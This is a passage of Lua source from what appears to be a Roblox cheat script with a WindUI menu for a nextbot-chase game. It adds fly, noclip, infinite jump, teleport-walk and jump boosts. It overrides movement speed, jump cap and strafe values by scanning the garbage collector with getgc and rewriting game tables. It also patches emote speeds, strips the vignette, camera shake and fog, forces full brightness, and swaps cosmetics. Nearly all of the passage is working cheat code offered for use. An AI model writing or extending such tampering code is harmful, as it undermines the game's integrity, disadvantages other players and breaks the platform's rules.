            EasyTrimpToggle:Set(getgenv().EasyTrimp.Enabled)
        end
        
        easyTrimpGuiButton.Text = getgenv().EasyTrimp.Enabled and "On" or "Off"
        easyTrimpGuiButton.BackgroundColor3 = getgenv().EasyTrimp.Enabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    end)
    
    return easyTrimpGui, easyTrimpGuiButton
end

EasyTrimpToggle = Tabs.Player:Toggle({
    Title = "Easy Trimp",
    Flag = "EasyTrimpToggle",
    Value = false,
    Callback = function(state)
        getgenv().EasyTrimp.Enabled = state
        
        if trimpToggleBtn then
            trimpToggleBtn.Text = getgenv().EasyTrimp.Enabled and "On" or "Off"
            trimpToggleBtn.BackgroundColor3 = getgenv().EasyTrimp.Enabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
        end
    end
})

EasyTrimpGuiToggle = Tabs.Player:Toggle({
    Title = "Easy Trimp GUI",
    Flag = "EasyTrimpGuiToggle",
    Desc = "Shows/Hides the Easy Trimp GUI for mobile users",
    Value = false,
    Callback = function(state)
        featureStates.EasyTrimpGuiVisible = state
        
        if state then
            if not easyTrimpGui then
                easyTrimpGui, trimpToggleBtn = createEasyTrimpGui(0)
            elseif easyTrimpGui then
                easyTrimpGui.Enabled = true
            end
        else
            if easyTrimpGui then
                easyTrimpGui:Destroy()
                easyTrimpGui = nil
                trimpToggleBtn = nil
            end
        end
    end
})

player.CharacterAdded:Connect(function()
    if featureStates.EasyTrimpGuiVisible and not easyTrimpGui then
        easyTrimpGui, trimpToggleBtn = createEasyTrimpGui(0)
    end
end)

easyTrimpInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == getgenv().EasyTrimp.ToggleKey then
        getgenv().EasyTrimp.Enabled = not getgenv().EasyTrimp.Enabled
        
        if EasyTrimpToggle then
            EasyTrimpToggle:Set(getgenv().EasyTrimp.Enabled)
        end
        
        if trimpToggleBtn then
            trimpToggleBtn.Text = getgenv().EasyTrimp.Enabled and "On" or "Off"
            trimpToggleBtn.BackgroundColor3 = getgenv().EasyTrimp.Enabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
        end
    end
end)
    InfiniteJumpToggle = Tabs.Player:Toggle({
        Title = "Infinite Jump",
        Flag = "InfiniteJumpToggle",
        Value = false,
        Callback = function(state)
            featureStates.InfiniteJump = state
        end
    })

    JumpMethodDropdown = Tabs.Player:Dropdown({
        Title = "Infinite Jump Method",
        Flag = "JumpMethodDropdown",
        Values = {"Hold", "Spam"},
        Value = "Hold",
        Callback = function(value)
            featureStates.JumpMethod = value
        end
    })
    FlyToggle = Tabs.Player:Toggle({
        Title = "Fly",
        Flag = "FlyToggle",
        Value = false,
        Callback = function(state)
            featureStates.Fly = state
            if state then
                startFlying()
            else
                stopFlying()
            end
        end
    })
    
    local FlySpeedSlider = Tabs.Player:Slider({
        Title = "Fly Speed",
        Flag = "FlySpeedSlider",
        Value = { Min = 1, Max = 200, Default = 5, Step = 1 },
                Desc = "Adjust fly speed",
        Callback = function(value)
            featureStates.FlySpeed = value
        end
    })
    InfiniteSlideToggle = Tabs.Player:Toggle({
    Title = "Infinite Slide",
    Flag = "InfiniteSlideToggle",
    Value = false,
    Callback = function(state)
        setInfiniteSlide(state)
    end
})

SlideFrictionInput = Tabs.Player:Input({
    Title = "Slide Friction",
    Flag = "SlideFrictionInput",
    Desc = "Negative Only And faster slide",
    Placeholder = "-8",
    NumbersOnly = true,
    Value = "-8",
    Callback = function(value)
        num = tonumber(value)
        if num and num < 0 then
            slideFrictionValue = num
            if infiniteSlideEnabled then
                setSlideFriction(slideFrictionValue)
            end
        end
    end
})
local noclipConnections = {}
local noclipEnabled = false

local function setNoCollision()
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and not object:IsDescendantOf(player.Character) then
            object.CanCollide = false
        end
    end
end

local function restoreCollisions()
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and not object:IsDescendantOf(player.Character) then
            object.CanCollide = true
        end
    end
end

local function checkPlayerPosition()
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    local humanoidRootPart = player.Character.HumanoidRootPart
    local rayOrigin = humanoidRootPart.Position
    local rayDistance = math.clamp(10, 1, 50)  
    local rayDirection = Vector3.new(0, -rayDistance, 0)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    if raycastResult and raycastResult.Instance:IsA("BasePart") then
        raycastResult.Instance.CanCollide = true
    end
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and object ~= (raycastResult and raycastResult.Instance) and not object:IsDescendantOf(player.Character) then
            object.CanCollide = false
        end
    end
end

local function onCharacterAdded(newCharacter)
    character = newCharacter
    humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart")
    if noclipEnabled then
        setNoCollision()
    end
end

NoclipToggle = Tabs.Player:Toggle({
    Title = "Noclip",
    Flag = "NoclipToggle",
    Desc = "Note: This feature Can make you fall to the void non-stop so be careful what you're doing when toggles this on",
    Icon = "ghost",
    Callback = function(state)
        noclipEnabled = state
        if state then
            character = player.Character
            humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            if character then
                setNoCollision()
            end
            noclipConnections.characterAdded = player.CharacterAdded:Connect(onCharacterAdded)
            noclipConnections.descendantAdded = workspace.DescendantAdded:Connect(function(descendant)
                if noclipEnabled and descendant:IsA("BasePart") and not descendant:IsDescendantOf(player.Character) then
                    descendant.CanCollide = false
                end
            end)
            noclipConnections.heartbeat = RunService.Heartbeat:Connect(checkPlayerPosition)
        else
            for _, conn in pairs(noclipConnections) do
                if conn then conn:Disconnect() end
            end
            noclipConnections = {}
            restoreCollisions()
        end
    end
})
    TPWALKToggle = Tabs.Player:Toggle({
        Title = "TP WALK",
        Flag = "TPWALKToggle",
        Value = false,
        Callback = function(state)
            featureStates.TPWALK = state
            if state then
                startTpwalk()
            else
                stopTpwalk()
            end
        end
    })

    local TPWALKSlider = Tabs.Player:Slider({
        Title = "TPWALK VALUE",
        Flag = "TPWALKSlider",
         Desc = "Adjust TPWALK speed",
        Value = { Min = 1, Max = 200, Default = 1, Step = 1 },
        Callback = function(value)
            featureStates.TpwalkValue = value
        end
    })

    JumpBoostToggle = Tabs.Player:Toggle({
        Title = "Jump Height",
        Flag = "JumpBoostToggle",
        Value = false,
        Callback = function(state)
            featureStates.JumpBoost = state
            if state then
                startJumpBoost()
            else
                stopJumpBoost()
            end
        end
    })

    local JumpBoostSlider = Tabs.Player:Slider({
        Title = "Jump Height",
        Flag = "JumpBoostSlider",
        Desc = "Adjust jump height",
        Value = { Min = 1, Max = 200, Default = 5, Step = 1 },
        Callback = function(value)
            featureStates.JumpPower = value
            if featureStates.JumpBoost then
                if humanoid then
                    humanoid.JumpPower = featureStates.JumpPower
                end
            end
        end
    })

Tabs.Player:Section({ Title = "Modifications" })

local function createValidatedInput(config)
    return function(input)
        local val = tonumber(input)
        if not val then return end
        
        if config.min and val < config.min then return end
        if config.max and val > config.max then return end
        
        currentSettings[config.field] = tostring(val)
        applyToTables(function(obj)
            obj[config.field] = val
        end)
    end
end

SpeedInput = Tabs.Player:Input({
    Title = "Set Speed",
    Flag = "SpeedInput",
    Icon = "speedometer",
    Placeholder = "Default 1500",
    Value = currentSettings.Speed,
    Callback = createValidatedInput({
        field = "Speed",
        min = 1450,
        max = 100008888
    })
})

JumpCapInput = Tabs.Player:Input({
    Title = "Set Jump Cap",
    Flag = "JumpCapInput",
    Icon = "chevrons-up",
    Placeholder = "Default 1",
    Value = currentSettings.JumpCap,
    Callback = createValidatedInput({
        field = "JumpCap",
        min = 0.1,
        max = 5088888
    })
})

StrafeInput = Tabs.Player:Input({
    Title = "Strafe Acceleration",
    Flag = "StrafeInput",
    Icon = "wind",
    Placeholder = "Default 187",
    Value = currentSettings.AirStrafeAcceleration,
    Callback = createValidatedInput({
        field = "AirStrafeAcceleration",
        min = 1,
        max = 1000888888
    })
})

ApplyMethodDropdown = Tabs.Player:Dropdown({
    Title = "Select Apply Method",
    Flag = "ApplyMethodDropdown",
    Values = { "Not Optimized", "Optimized" },
    Multi = false,
    Default = getgenv().ApplyMode,
    Callback = function(value)
        getgenv().ApplyMode = value
    end
})
Tabs.Player:Section({ Title = "Emote Speed (BETA)" })
originalEmoteSpeeds = {}
itemsFolder = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
if itemsFolder then
    emotesFolder = itemsFolder:FindFirstChild("Emotes")
    if emotesFolder then
        for _, emoteModule in ipairs(emotesFolder:GetChildren()) do
            if emoteModule:IsA("ModuleScript") then
                success, emoteData = pcall(require, emoteModule)
                if success and emoteData and emoteData.EmoteInfo then
                    originalEmoteSpeeds[emoteModule.Name] = emoteData.EmoteInfo.SpeedMult
                end
            end
        end
    end
end

function applyEmoteSpeed(speedValue)
    if not itemsFolder then return end
    emotesFolder = itemsFolder:FindFirstChild("Emotes")
    if not emotesFolder then return end
    
    for _, emoteModule in ipairs(emotesFolder:GetChildren()) do
        if emoteModule:IsA("ModuleScript") then
            success, emoteData = pcall(require, emoteModule)
            if success and emoteData and emoteData.EmoteInfo and emoteData.EmoteInfo.SpeedMult ~= 0 then
                emoteData.EmoteInfo.SpeedMult = speedValue
            end
        end
    end
end

function restoreOriginalEmoteSpeeds()
    if not itemsFolder then return end
    emotesFolder = itemsFolder:FindFirstChild("Emotes")
    if not emotesFolder then return end
    
    for _, emoteModule in ipairs(emotesFolder:GetChildren()) do
        if emoteModule:IsA("ModuleScript") then
            originalSpeed = originalEmoteSpeeds[emoteModule.Name]
            if originalSpeed then
                success, emoteData = pcall(require, emoteModule)
                if success and emoteData and emoteData.EmoteInfo then
                    emoteData.EmoteInfo.SpeedMult = originalSpeed
                end
            end
        end
    end
end

function getMatchingTables()
    matched = {}
    for _, obj in pairs(getgc(true)) do
        if typeof(obj) == "table" then
            ok = true
            for field in pairs(requiredFields) do
                if rawget(obj, field) == nil then
                    ok = false
                    break
                end
            end
            if ok then
                table.insert(matched, obj)
            end
        end
    end
    return matched
end

function applySpeedMultiplier(speedMultiplier)
    targets = getMatchingTables()
    for _, tableObj in ipairs(targets) do
        if tableObj and typeof(tableObj) == "table" then
            pcall(function()
                tableObj.WalkSpeedMultiplier = speedMultiplier
            end)
        end
    end
end

function getPlayerObj()
    gamePlayers = workspace.Game and workspace.Game.Players
    if not gamePlayers then return nil end
    return gamePlayers:FindFirstChild(player.Name)
end

playerObj = nil
connection = nil

function setupConnection(obj)
    if connection then 
        connection:Disconnect() 
        connection = nil
    end
    playerObj = obj
    if not obj then return end
    
    function onStateChanged()
        state = obj:GetAttribute("State")
        targetSpeed = (state == "Emoting") and emotingSpeed or 1.5
        applySpeedMultiplier(targetSpeed)
    end
    
    onStateChanged()
    connection = obj:GetAttributeChangedSignal("State"):Connect(onStateChanged)
end

emotingSpeed = 1.5

function resetMultiplierSpeed()
    emotingSpeed = 1.5
    applySpeedMultiplier(1.5)
end

EmoteSpeedModeDropdown = Tabs.Player:Dropdown({
    Title = "Emote speed mode",
    Flag = "EmoteSpeedModeDropdown",
    Values = {"Nah", "Legit", "Multiplier speed"},
    Value = "Nah",
    Callback = function(value)
        if value == "Nah" then
            resetMultiplierSpeed()
            restoreOriginalEmoteSpeeds()
            if connection then 
                connection:Disconnect() 
                connection = nil
            end
        elseif value == "Multiplier speed" then
            restoreOriginalEmoteSpeeds()
            setupConnection(getPlayerObj())
            task.spawn(function()
                while EmoteSpeedModeDropdown.Value == "Multiplier speed" do
                    task.wait(2)
                    current = getPlayerObj()
                    if current ~= playerObj then
                        setupConnection(current)
                    elseif playerObj then
                        state = playerObj:GetAttribute("State")
                        targetSpeed = (state == "Emoting") and emotingSpeed or 1.5
                        applySpeedMultiplier(targetSpeed)
                    end
                end
            end)
        elseif value == "Legit" then
            resetMultiplierSpeed()
            if connection then 
                connection:Disconnect() 
                connection = nil
            end
            speedValue = featureStates.EmoteSpeedValue or 2
            applyEmoteSpeed(speedValue)
        end
    end
})
EmoteSpeedInput = Tabs.Player:Input({
    Title = "Emote Speed Value",
    Flag = "EmoteSpeedInput",
    Placeholder = "1500",
    NumbersOnly = true,
    Callback = function(value)
        num = tonumber(value)
        if num and num > 0 then
            featureStates.EmoteSpeedValue = num
            if EmoteSpeedModeDropdown.Value == "Legit" then
                appliedValue = num / 1000
                applyEmoteSpeed(appliedValue)
            elseif EmoteSpeedModeDropdown.Value == "Multiplier speed" then
                appliedValue = num / 1000
                emotingSpeed = appliedValue
            end
        end
    end
})
ApplyUnwalkableButton = Tabs.Player:Button({
    Title = "Apply Speed unwalkable Emote",
    Callback = function()
        if not itemsFolder then return end
        
        emotesFolder = itemsFolder:FindFirstChild("Emotes")
        if not emotesFolder then return end
        
        speedValue = featureStates.EmoteSpeedValue or 2
        
        for _, emoteModule in ipairs(emotesFolder:GetChildren()) do
            if emoteModule:IsA("ModuleScript") then
                success, emoteData = pcall(require, emoteModule)
                if success and emoteData and emoteData.EmoteInfo and emoteData.EmoteInfo.SpeedMult == 0 then
                    emoteData.EmoteInfo.SpeedMult = speedValue
                end
            end
        end
    end
})

ResetEmoteSpeedButton = Tabs.Player:Button({
    Title = "Reset Emote Speed",
    Desc= "Having Trouble? reset the speed or rejoin",
    Callback = function()
        restoreOriginalEmoteSpeeds()
        resetMultiplierSpeed()
    end
})
    -- Visuals Tab
    Tabs.Visuals:Section({ Title = "Visual", TextSize = 20 })
    Tabs.Visuals:Divider()
    local cameraStretchConnection
local function setupCameraStretch()
    cameraStretchConnection = nil
    local stretchHorizontal = 0.80
    local stretchVertical = 0.80
    CameraStretchToggle = Tabs.Visuals:Toggle({
        Title = "Camera Stretch",
        Flag = "CameraStretchToggle",
        Value = false,
        Callback = function(state)
            if state then
                if cameraStretchConnection then cameraStretchConnection:Disconnect() end
                cameraStretchConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local Camera = workspace.CurrentCamera
                    Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, stretchHorizontal, 0, 0, 0, stretchVertical, 0, 0, 0, 1)
                end)
            else
                if cameraStretchConnection then
                    cameraStretchConnection:Disconnect()
                    cameraStretchConnection = nil
                end
            end
        end
    })

    CameraStretchHorizontalInput = Tabs.Visuals:Input({
        Title = "Camera Stretch Horizontal",
        Flag = "CameraStretchHorizontalInput",
        Placeholder = "0.80",
        Numeric = true,
        Value = tostring(stretchHorizontal),
        Callback = function(value)
            local num = tonumber(value)
            if num then
                stretchHorizontal = num
                if cameraStretchConnection then
                    cameraStretchConnection:Disconnect()
                    cameraStretchConnection = game:GetService("RunService").RenderStepped:Connect(function()
                        local Camera = workspace.CurrentCamera
                        Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, stretchHorizontal, 0, 0, 0, stretchVertical, 0, 0, 0, 1)
                    end)
                end
            end
        end
    })

    CameraStretchVerticalInput = Tabs.Visuals:Input({
        Title = "Camera Stretch Vertical",
        Flag = "CameraStretchVerticalInput",
        Placeholder = "0.80",
        Numeric = true,
        Value = tostring(stretchVertical),
        Callback = function(value)
            local num = tonumber(value)
            if num then
                stretchVertical = num
                if cameraStretchConnection then
                    cameraStretchConnection:Disconnect()
                    cameraStretchConnection = game:GetService("RunService").RenderStepped:Connect(function()
                        local Camera = workspace.CurrentCamera
                        Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, stretchHorizontal, 0, 0, 0, stretchVertical, 0, 0, 0, 1)
                    end)
                end
            end
        end
    })
end

setupCameraStretch()


local module_upvr = {}
module_upvr.__index = module_upvr

local currentModuleInstance = nil

function module_upvr.new()
    if currentModuleInstance then
        currentModuleInstance = nil
    end

    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui", 5)
    local self = setmetatable({
        Player = player,
        Enabled = false,
        Visible = false,
    }, module_upvr)

    local nextbotNoise
    local success, err = pcall(function()
        local shared = playerGui:FindFirstChild("Shared")
        if shared then
            local hud = shared:FindFirstChild("HUD")
            if hud then
                nextbotNoise = hud:FindFirstChild("NextbotNoise")
            end
        end
        if not nextbotNoise then
            local hud = playerGui:FindFirstChild("HUD")
            if hud then
                nextbotNoise = hud:FindFirstChild("NextbotNoise")
            end
        end
        if not nextbotNoise then
            nextbotNoise = playerGui:FindFirstChild("NextbotNoise")
        end
    end)

    if not success or not nextbotNoise then
        warn("Failed to find NextbotNoise in PlayerGui: " .. (err or "Unknown error"))
        return self
    end

    self.originalSize = nextbotNoise.Size
    self.originalPosition = nextbotNoise.Position
    self.originalImageTransparency = nextbotNoise.ImageTransparency
    self.originalNoiseTransparency = nextbotNoise:FindFirstChild("Noise") and nextbotNoise.Noise.ImageTransparency or 0
    self.originalNoise2Transparency = nextbotNoise:FindFirstChild("Noise2") and nextbotNoise.Noise2.ImageTransparency or 0

    local transparencySuccess, transparencyErr = pcall(function()
        local inset = game:GetService("GuiService"):GetGuiInset()
        nextbotNoise.Position = UDim2.new(0.5, 0, 0, -inset.Y)
        nextbotNoise.Size = UDim2.new(0, 0, 0, 0)
        nextbotNoise.ImageTransparency = 1
        if nextbotNoise:FindFirstChild("Noise") then
            nextbotNoise.Noise.ImageTransparency = 1
        else
            warn("Noise not found in NextbotNoise")
        end
        if nextbotNoise:FindFirstChild("Noise2") then
            nextbotNoise.Noise2.ImageTransparency = 1
        else
            warn("Noise2 not found in NextbotNoise")
        end
    end)

    if not transparencySuccess then
        warn("Failed to set vignette properties: " .. transparencyErr)
    end

    self.Noise = nextbotNoise
    currentModuleInstance = self
    return self
end

function module_upvr.stop(self)
    if self.Noise then
        local success, err = pcall(function()
            self.Noise.Size = self.originalSize
            self.Noise.Position = self.originalPosition
            self.Noise.ImageTransparency = self.originalImageTransparency
            if self.Noise:FindFirstChild("Noise") then
                self.Noise.Noise.ImageTransparency = self.originalNoiseTransparency
            end
            if self.Noise:FindFirstChild("Noise2") then
                self.Noise.Noise2.ImageTransparency = self.originalNoise2Transparency
            end
        end)
        if not success then
            warn("Failed to restore vignette properties: " .. err)
        end
    end
    currentModuleInstance = nil
end

function module_upvr.Update(arg1, arg2)
    if arg1 and arg1.Noise then
        local success, err = pcall(function()
            if arg1.Noise:IsA("ImageLabel") or arg1.Noise:IsA("Frame") then
                arg1.Noise.ImageTransparency = 1
                if arg1.Noise:FindFirstChild("Noise") then
                    arg1.Noise.Noise.ImageTransparency = 1
                end
                if arg1.Noise:FindFirstChild("Noise2") then
                    arg1.Noise.Noise2.ImageTransparency = 1
                end
            end
        end)
        if not success then
            warn("Update failed to set transparencies: " .. err)
        end
    end
end



local stableCameraInstance = nil

local StableCamera = {}
StableCamera.__index = StableCamera

function StableCamera.new(maxDistance)
    local self = setmetatable({}, StableCamera)
    self.Player = Players.LocalPlayer
    self.MaxDistance = maxDistance or 50
    self._conn = RunService.RenderStepped:Connect(function(dt) self:Update(dt) end)
    return self
end

local function tryResetShake(player)
    if not player then return end
    local ok, playerScripts = pcall(function() return player:FindFirstChild("PlayerScripts") end)
    if not ok or not playerScripts then return end
    local cameraSet = playerScripts:FindFirstChild("Camera") and playerScripts.Camera:FindFirstChild("Set")
    if cameraSet and type(cameraSet.Invoke) == "function" then
        pcall(function()
            cameraSet:Invoke("CFrameOffset", "Shake", CFrame.new())
        end)
    end
end

function StableCamera:Update(dt)
    if Players and Players.LocalPlayer then
        tryResetShake(Players.LocalPlayer)
    end
end

function StableCamera:Destroy()
    if self._conn then
        self._conn:Disconnect()
        self._conn = nil
    end
end

DisableCameraShakeToggle = Tabs.Visuals:Toggle({
    Title = "Disable Camera Shake",
    Flag = "DisableCameraShakeToggle",
    Value = false,
    Callback = function(state)
        featureStates.DisableCameraShake = state
        if state then
            if stableCameraInstance then
                stableCameraInstance:Destroy()
                stableCameraInstance = nil
            end
            stableCameraInstance = StableCamera.new(50)
            pcall(function()
                WindUI:Notify({ Title = "Camera", Content = "Camera shake disabled", Duration = 0 })
            end)
        else
            if stableCameraInstance then
                stableCameraInstance:Destroy()
                stableCameraInstance = nil
            end
            pcall(function()
                WindUI:Notify({ Title = "Camera", Content = "Camera shake enabled", Duration = 0 })
            end)
        end
    end
})

local vignetteEnabled = false

Disablevignette = Tabs.Visuals:Toggle({
    Title = "Disable Vignette",
    Flag = "Disablevignette",
    Default = false,
    Callback = function(value)
        vignetteEnabled = value
        if value then
            local vignetteInstance = module_upvr.new()
            if vignetteInstance then
                vignetteConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
                    module_upvr.Update(vignetteInstance, dt)
                end)
            end
        else
            if vignetteConnection then
                vignetteConnection:Disconnect()
                vignetteConnection = nil
            end
            if currentModuleInstance then
                module_upvr.stop(currentModuleInstance)
            end
        end
    end
})

game.Players.LocalPlayer.CharacterAdded:Connect(function()
    warn("Player respawned - checking vignette disable")
    wait(1)
    
    if vignetteEnabled then
        warn("Reapplying vignette disable after respawn")
        local vignetteInstance = module_upvr.new()
        if vignetteInstance then
            if vignetteConnection then
                vignetteConnection:Disconnect()
            end
            vignetteConnection = game:GetService("RunService").Heartbeat:Connect(function(dt)
                module_upvr.Update(vignetteInstance, dt)
            end)
        end
    end
end)

	    FullBrightToggle = Tabs.Visuals:Toggle({
    Title = "Full Bright",
    Flag = "FullBrightToggle",
    Desc = "Ya Like drinking Night Vision while mining in da cave and sceard of creeper blow you up dawg?",
    Value = false,
    Callback = function(state)
        featureStates.FullBright = state
        if state then
            local Lighting = game:GetService("Lighting")
            
            featureStates.originalBrightness = Lighting.Brightness
            featureStates.originalAmbient = Lighting.Ambient
            featureStates.originalOutdoorAmbient = Lighting.OutdoorAmbient
            featureStates.originalColorShiftBottom = Lighting.ColorShift_Bottom
            featureStates.originalColorShiftTop = Lighting.ColorShift_Top
            
            local function applyFullBright()
                if Lighting.Brightness ~= 1 then
                    Lighting.Brightness = 1
                end
                if Lighting.Ambient ~= Color3.new(1, 1, 1) then
                    Lighting.Ambient = Color3.new(1, 1, 1)
                end
                if Lighting.OutdoorAmbient ~= Color3.new(1, 1, 1) then
                    Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
                end
                if Lighting.ColorShift_Bottom ~= Color3.new(1, 1, 1) then
                    Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
                end
                if Lighting.ColorShift_Top ~= Color3.new(1, 1, 1) then
                    Lighting.ColorShift_Top = Color3.new(1, 1, 1)
                end
            end
            
            applyFullBright()
            
            if featureStates.fullBrightConnection then
                featureStates.fullBrightConnection:Disconnect()
            end
            
            featureStates.fullBrightConnection = RunService.Heartbeat:Connect(function()
                if featureStates.FullBright then
                    applyFullBright()
                end
            end)
            
            featureStates.fullBrightCharConnection = game.Players.LocalPlayer.CharacterAdded:Connect(function()
                task.wait(1)
                if featureStates.FullBright then
                    applyFullBright()
                end
            end)
            
        else
            if featureStates.fullBrightConnection then
                featureStates.fullBrightConnection:Disconnect()
                featureStates.fullBrightConnection = nil
            end
            
            if featureStates.fullBrightCharConnection then
                featureStates.fullBrightCharConnection:Disconnect()
                featureStates.fullBrightCharConnection = nil
            end
            
            if featureStates.originalBrightness then
                local Lighting = game:GetService("Lighting")
                Lighting.Brightness = featureStates.originalBrightness
                Lighting.Ambient = featureStates.originalAmbient
                Lighting.OutdoorAmbient = featureStates.originalOutdoorAmbient
                Lighting.ColorShift_Bottom = featureStates.originalColorShiftBottom
                Lighting.ColorShift_Top = featureStates.originalColorShiftTop
            end
        end
    end
})

NoFogToggle = Tabs.Visuals:Toggle({
    Title = "Remove Fog",
    Flag = "NoFogToggle",
    Value = false,
    Callback = function(state)
        featureStates.NoFog = state
        if state then
            startNoFog()
        else
            stopNoFog()
        end
    end
})
Tabs.Visuals:Button({
    Title = "Shit Render", 
    Callback = function()
        Lighting = game:GetService("Lighting")
        Terrain = workspace:FindFirstChildOfClass("Terrain")
        Players = game:GetService("Players")
        LocalPlayer = Players.LocalPlayer

        Lighting.GlobalShadows = false
        Lighting.FogEnd = 1e10
        Lighting.Brightness = 1

        if Terrain then
            Terrain.WaterWaveSize = 0
            Terrain.WaterWaveSpeed = 0
            Terrain.WaterReflectance = 0
            Terrain.WaterTransparency = 1
        end

        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                obj.Material = Enum.Material.Plastic
                obj.Reflectance = 0
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                obj:Destroy()
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
                obj:Destroy()
            elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
                obj:Destroy()
            end
        end

        for _, player in ipairs(Players:GetPlayers()) do
            local char = player.Character
            if char then
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("Accessory") or part:IsA("Clothing") then
                        part:Destroy()
                    end
                end
            end
        end
    end
})
local originalFOV = workspace.CurrentCamera.FieldOfView
local FOVSlider = Tabs.Visuals:Slider({
    Title = "Field of View",
    Flag = "FOVSlider",
    Desc = "Old fov has been moved to settings, will be add back in here soon",
    Value = { Min = 10, Max = 120, Default = originalFOV, Step = 1 },
    Callback = function(value)
        workspace.CurrentCamera.FieldOfView = tonumber(value)
    end
})
TimerDisplayToggle = Tabs.Visuals:Toggle({
    Title = "Timer Display",
    Flag = "TimerDisplayToggle",
    Value = false,
    Callback = function(state)
        featureStates.TimerDisplay = state

        local function getRoundTimer()
            local player = game:GetService("Players").LocalPlayer
            local pg = player.PlayerGui
            local shared = pg:FindFirstChild("Shared")
            local hud = shared and shared:FindFirstChild("HUD")
            local overlay = hud and hud:FindFirstChild("Overlay")
            local default = overlay and overlay:FindFirstChild("Default")
            local ro = default and default:FindFirstChild("RoundOverlay")
            local round = ro and ro:FindFirstChild("Round")
            return round and round:FindFirstChild("RoundTimer")
        end

        local function setContainerVisible(visible)
            local pg = game:GetService("Players").LocalPlayer.PlayerGui
            local main = pg:FindFirstChild("MainInterface")
            if main then
                local container = main:FindFirstChild("TimerContainer")
                if container then
                    container.Visible = visible
                end
            end
        end

        if state then
            task.spawn(function()
                while featureStates.TimerDisplay do
                    local timer = getRoundTimer()
                    if timer then
                        setContainerVisible(not timer.Visible)
                    else
                        setContainerVisible(true)
                    end
                    task.wait(0.1)
                end
                setContainerVisible(false)
            end)
        else
            setContainerVisible(false)
        end
    end
})
    Tabs.Visuals:Section({ Title = "Cosmetics Changer", TextSize = 20 })
    Tabs.Visuals:Divider()
    
    local cosmetic1, cosmetic2 = "" --made by @.scv8 discord server https://discord.gg/RBZVmT6UKs
    local originalCosmetic1, originalCosmetic2 = "", ""
    local isSwapped = false
    
    Tabs.Visuals:Input({
        Title = "Current Cosmetics",
        Placeholder = "",
        Callback = function(v) 
            cosmetic1 = v
            if not isSwapped then
                originalCosmetic1 = v
            end
        end
    })
    
    Tabs.Visuals:Input({
        Title = "Select Cosmetics",
        Placeholder = "",
        Callback = function(v) 
            cosmetic2 = v
            if not isSwapped then
                originalCosmetic2 = v
            end
        end
    })
    
    Tabs.Visuals:Button({
        Title = "Apply Cosmetics",
        Callback = function()
            pcall(function()
                if cosmetic1 == "" or cosmetic2 == "" or cosmetic1 == cosmetic2 then return end
                
                local ReplicatedStorage = game:GetService("ReplicatedStorage")    
                local Cosmetics = ReplicatedStorage:WaitForChild("Items"):WaitForChild("Cosmetics")    
                
                local function normalize(str)    
                    return str:gsub("%s+", ""):lower()    
                end    
                
                local function levenshtein(s, t)    
                    local m, n = #s, #t    
                    local d = {}    
                    for i = 0, m do d[i] = {[0] = i} end    
                    for j = 0, n do d[0][j] = j end    
                    
                    for i = 1, m do    
                        for j = 1, n do    
                            local cost = (s:sub(i,i) == t:sub(j,j)) and 0 or 1    
                            d[i][j] = math.min(    
                                d[i-1][j] + 1,    
                                d[i][j-1] + 1,    
                                d[i-1][j-1] + cost    
                            )    
                        end    
                    end    
                    return d[m][n]    
                end    
                
                local function similarity(s, t)    
                    local nS, nT = normalize(s), normalize(t)    
                    local dist = levenshtein(nS, nT)    
                    return 1 - dist / math.max(#nS, #nT)    
                end    
                
                local function findSimilar(name)    
                    local bestMatch = name    
                    local bestScore = 0.5    
                    for _, c in ipairs(Cosmetics:GetChildren()) do    
                        local score = similarity(name, c.Name)    
                        if score > bestScore then    
                            bestScore = score    
                            bestMatch = c.Name    
                        end    
                    end    
                    return bestMatch    
                end    
                
                cosmetic1 = findSimilar(cosmetic1)    
                cosmetic2 = findSimilar(cosmetic2)    
                
                local a = Cosmetics:FindFirstChild(cosmetic1)    
                local b = Cosmetics:FindFirstChild(cosmetic2)    
                if not a or not b then return end    
                
                -- Store original names before swapping
                if not isSwapped then
                    originalCosmetic1 = cosmetic1
                    originalCosmetic2 = cosmetic2
                end
                
                local tempRoot = Instance.new("Folder", Cosmetics)    
                tempRoot.Name = "__temp_swap_" .. tostring(tick()):gsub("%.", "_")    
                
                local tempA = Instance.new("Folder", tempRoot)    
                local tempB = Instance.new("Folder", tempRoot)    
                
                for _, c in ipairs(a:GetChildren()) do c.Parent = tempA end    
                for _, c in ipairs(b:GetChildren()) do c.Parent = tempB end    
                
                for _, c in ipairs(tempA:GetChildren()) do c.Parent = b end    
                for _, c in ipairs(tempB:GetChildren()) do c.Parent = a end    
                
                tempRoot:Destroy()
                
                isSwapped = true
                
                WindUI:Notify({
                    Title = "Cosmetics Changer",
                    Content = "Successfully swapped " .. cosmetic1 .. " with " .. cosmetic2,
                    Duration = 3
                })
            end)    
        end
    })
    
    Tabs.Visuals:Button({
        Title = "Reset Cosmetics",
        Desc = "Restore cosmetics to their original state",
        Callback = function()
            pcall(function()
